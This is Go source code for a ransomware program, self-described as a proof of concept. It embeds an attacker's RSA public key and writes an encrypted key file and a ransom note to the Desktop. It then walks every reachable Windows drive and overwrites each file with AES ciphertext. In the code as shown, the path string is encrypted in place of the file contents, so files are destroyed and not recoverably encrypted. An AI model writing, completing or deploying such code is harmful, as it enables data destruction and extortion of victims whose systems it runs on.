// MIT License @ Copyright (c) 2023, Alx3Dev

package main

import (
	"crypto/aes"
	"crypto/cipher"
	"crypto/rand"
	"crypto/rsa"
	"crypto/sha256"
	"crypto/x509"
	"encoding/base64"
	"encoding/pem"
	"io"
	"io/fs"
	"os"
	"os/user"
	"path/filepath"
)

// base64 encoded RSA-PUBLIC-KEY
const KEY = "LS0tLS1CRUdJTiBSU0EgUFVCTElDIEtFWS0tLS0tCk1JSUNDZ0tDQWdFQTFsUnpnQnJQUlI0ZGtTc3ZJTklpNC9ON1I2YThtSTUzZUNlblkxL254K210d09sbS9JekkKbE9ST2pPd0IrbDlmZlVRMEhrRUVldkhqUUZJWHJCUnhzd2lLUGMwb2ZnSzVVbnl0NjRjTUFSZDJDRmN2enh1VgphcWZvN2dBZGVObEtZcVdBZ2JSZHZjYlFwa0xnajhUTGpwaVIxQkUzMkVsL1dXRGFpNW4wQ3VIa2NGdzUwS3p5CkYrTGtoeVVPYVM3U0Z6M2theUZuSTRQSkdEdlNGQ1VKZ0M0UEFvNlF1Mjk5UlgyS0VBdGVOSXozOEJkV2ZaaXEKOGxYOXMyM1dwaVFBUXpOeC84Z1RMOWlIU2JXaUhHL2FhbWdUZE1qSjMrc0hhQ2Z0NWl5SS9zc1JRcmpCYVQ3RApXQ1hrSEsrNEliUG9EYkVZWTJDWDB5TXoyUzBTTjVrS1UyL3FyZ1VMTlJEYjZpc1NvQnhWTlN6RGdYK0cwWXd5Ck9WaTdINEMxL3cxSm8zbFQ5UmRwd0I3SHBvWkZyNUhzdVJvZ3QraVdIajh0UjNDNElXTzdkR0pJVUNHRHZpOHkKZXk4eklGQjN3YVdIR2hMekNYMjl6M09rOUp6RHQ1MTJOV0w2dkNoVllNdm9xNU50ZkRoSVJQUUpscmN2bDcwaApXNUExOGd2cUpYMzEzdVhrUWZNb0MwTklCZUZLRk9POForNkJPZGdvbEdyYWxPR3AzYU9aVXhiUU05TUg1dU1JCmlsNlk1MjVlTUh1dFFkenQ5ck9CVnpJZk90MlNrb1RFeUhJSEJKWWU3bDgzOU5kaHZHTEcydW1OS0dQbWdIVXMKakdGMHFjU0IwS29ONTQ3b1plNDIvaW0wM1RSVjFTOHpSN0hDNzZMOTVXSDhnRHlKaHVoWVliMENBd0VBQVE9PQotLS0tLUVORCBSU0EgUFVCTElDIEtFWS0tLS0t"

type ransom struct {
	password string        // aes-encryption-cipher
	message  string        // clear-text-message
	public   rsa.PublicKey // base64-decoded-KEY
	aes      cipher.Block  // file-encryption
}

// decode public key, generate and export
// encrypted AES password, together clear-text message
func start(msg string) *ransom {

	rns := &ransom{
		password: token(),
		message:  msg,
		public:   *parse_key(KEY),
	}

	password := MessageToPEM(rns.encrypt(rns.password))
	export(password, "password.ransom", "Desktop")

	export([]byte(msg), "READ_ME", "Desktop")

	return rns
}

// decode rsa public key so it can be used for encryption
func parse_key(key string) *rsa.PublicKey {
	pk := decode(key)
	pbk, _ := pem.Decode(pk)
	public_key, err := x509.ParsePKCS1PublicKey(pbk.Bytes)
	handleError(err)

	return public_key
}

// encrypt message with RSA public key
func (keys *ransom) encrypt(msg string) []byte {
	message := []byte(msg)
	label := []byte("")
	hash := sha256.New()

	cipher_text, err := rsa.EncryptOAEP(hash, rand.Reader, &keys.public, message, label)

	handleError(err)

	return cipher_text
}

// export (encrypted AES) key to Desktop
// or in a working directory
func export(key []byte, label string, path string) {
	if path == "" {
		wd, _ := os.Getwd()
		path = filepath.Join(wd, label)
	} else {
		comp, cerr := user.Current()
		handleError(cerr)
		homedir := comp.HomeDir
		path = filepath.Join(homedir, path, label)
	}
	err := os.WriteFile(path, key, 0600)
	handleError(err)
}

// get RSA encrypted message in a readable format
func MessageToPEM(msg []byte) []byte {
	return pem.EncodeToMemory(&pem.Block{
		Type:  "MESSAGE",
		Bytes: msg})
}

// if we can't get encryption working, no point of running program
func handleError(err error) {
	if err != nil {
		panic(err)
	}
}

// generate 32bytes for AES password
func token() string {
	r_bytes := make([]byte, 32)
	_, err := rand.Read(r_bytes)
	handleError(err)

	return encode(string(r_bytes))
}

// base64 encode
func encode(key string) string {
	return base64.URLEncoding.EncodeToString([]byte(key))
}

// base64 decode
func decode(enkey string) []byte {
	key, err := base64.URLEncoding.DecodeString(enkey)
	handleError(err)
	return key
}

// walk through directories and encrypt each file
func (keys *ransom) walk(s string, d fs.DirEntry, err error) error {
	if err != nil {
		return err
	}
	if !d.IsDir() {
		if d.Name() == "password.ransom" || d.Name() == "READ_ME" {
			return nil
		}
		msg := []byte(s)

		cipherText := make([]byte, aes.BlockSize+len(msg))
		iv := cipherText[:aes.BlockSize]

		if _, err = io.ReadFull(rand.Reader, iv); err != nil {
			return err
		}
		stream := cipher.NewCFBEncrypter(keys.aes, iv)
		stream.XORKeyStream(cipherText[aes.BlockSize:], msg)

		encrypted := base64.RawStdEncoding.EncodeToString(cipherText)
		os.WriteFile(string(s), []byte(encrypted), 0600)
	}
	return nil
}

func main() {

	// parse RSA public key
	// generate and export encrypted AES passwords
	r := start("Attacker Message: 'Ransomware Proof Of Concept'")

	// make AES cipher
	aesc := []byte(decode(r.password))
	aesEn, aesErr := aes.NewCipher(aesc)
	handleError(aesErr)

	// handle AES encryption
	r.aes = aesEn
	aesc = nil
	aesEn = nil

	// find partitions
	var drive_params []string
	for _, drive := range "ABCDEFGHIJKLMNOPQRSTUVWXYZ" {
		f, err := os.Open(string(drive) + ":\\")
		if err == nil {
			drive_params = append(drive_params, string(drive))
		}
		f.Close()
	}

	// handle recursive encryption for found partitions
	for _, d := range drive_params {
		filepath.WalkDir(d, r.walk)
	}

	// at the end, replace token in memory
	for x := 0; x < 10; x++ {
		r.password = token()
	}
}
